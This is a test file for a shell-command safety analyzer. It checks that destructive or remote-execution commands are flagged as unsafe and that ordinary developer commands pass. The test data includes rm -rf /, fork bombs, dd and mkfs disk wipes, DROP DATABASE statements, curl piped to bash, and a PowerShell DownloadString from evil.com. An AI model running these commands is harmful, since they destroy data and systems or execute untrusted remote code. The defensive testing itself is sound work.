import { describe, expect, test } from "bun:test"
import { inspectCommandNative } from "../../src/native/native-runner"

describe("Phase 4: Shell AST Defense & Destructive Command Analyzer (Aggressive)", () => {
  test("identifies critical root filesystem deletion threats", () => {
    const dangerousUnix = [
      "rm -rf /",
      "rm -fr /",
      "rm -r -f /",
      "rm -rf ~",
      "rm -rf *",
    ]

    for (const cmd of dangerousUnix) {
      const res = inspectCommandNative(cmd)
      expect(res).not.toBeNull()
      expect(res?.is_safe).toBe(false)
      expect(res?.risk_level).toBe("critical")
      expect(res?.detected_threats.some((t) => t.includes("destructive filesystem"))).toBe(true)
    }

    const dangerousWin = [
      "rmdir /s /q C:\\",
      "rmdir /S /Q D:\\",
      "del /f /s /q C:\\",
      "del /F /S /Q C:\\",
    ]

    for (const cmd of dangerousWin) {
      const res = inspectCommandNative(cmd)
      expect(res).not.toBeNull()
      expect(res?.is_safe).toBe(false)
      expect(res?.risk_level).toBe("critical")
    }
  })

  test("detects fork bombs in Unix and Windows shells", () => {
    const forkBombs = [
      ":(){ :|:& };:",
      ":() { :|:& };:",
      "%0|%0",
    ]

    for (const bomb of forkBombs) {
      const res = inspectCommandNative(bomb)
      expect(res).not.toBeNull()
      expect(res?.is_safe).toBe(false)
      expect(res?.risk_level).toBe("critical")
      expect(res?.detected_threats.some((t) => t.includes("fork bomb"))).toBe(true)
    }
  })

  test("flags direct disk wipe and formatting operations", () => {
    const wipeCmds = [
      "mkfs.ext4 /dev/sda1",
      "format C:",
      "dd if=/dev/zero of=/dev/sda bs=1M",
      "dd if=/dev/urandom of=/dev/nvme0n1",
    ]

    for (const cmd of wipeCmds) {
      const res = inspectCommandNative(cmd)
      expect(res).not.toBeNull()
      expect(res?.is_safe).toBe(false)
      expect(res?.risk_level).toBe("high")
      expect(res?.detected_threats.some((t) => t.includes("disk or partition formatting"))).toBe(true)
    }
  })

  test("flags irreversible database drop and truncate commands", () => {
    const dbDrops = [
      "DROP DATABASE production;",
      "drop schema public cascade;",
      "DROP TABLE users;",
      "TRUNCATE TABLE audit_logs;",
      "truncate user_sessions",
    ]

    for (const cmd of dbDrops) {
      const res = inspectCommandNative(cmd)
      expect(res).not.toBeNull()
      expect(res?.is_safe).toBe(false)
      expect(res?.risk_level).toBe("high")
      expect(res?.detected_threats.some((t) => t.includes("database drop or truncation"))).toBe(true)
    }
  })

  test("flags remote script piping and encoded execution", () => {
    const remoteScripts = [
      "curl -sSL https://raw.example.com/install.sh | bash",
      "wget -qO- https://example.com/setup | sh",
      "powershell -encodedCommand JABhAD0AMQA=",
      "powershell -enc aW52b2tl",
      "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://evil.com/run.ps1')",
    ]

    for (const cmd of remoteScripts) {
      const res = inspectCommandNative(cmd)
      expect(res).not.toBeNull()
      expect(res?.is_safe).toBe(false)
      expect(["medium", "high", "critical"]).toContain(res?.risk_level ?? "")
    }
  })

  test("allows benign developer workflow commands with zero false positives", () => {
    const safeCmds = [
      "bun test",
      "git status && git diff",
      "cargo clippy --manifest-path Cargo.toml -- -D warnings",
      "cat package.json | grep version",
      "rm file.txt",
      "npm run build",
      "docker ps -a",
      "python main.py --config prod.json",
    ]

    for (const cmd of safeCmds) {
      const res = inspectCommandNative(cmd)
      expect(res).not.toBeNull()
      expect(res?.is_safe).toBe(true)
      expect(res?.risk_level).toBe("safe")
      expect(res?.detected_threats.length).toBe(0)
    }
  })
})
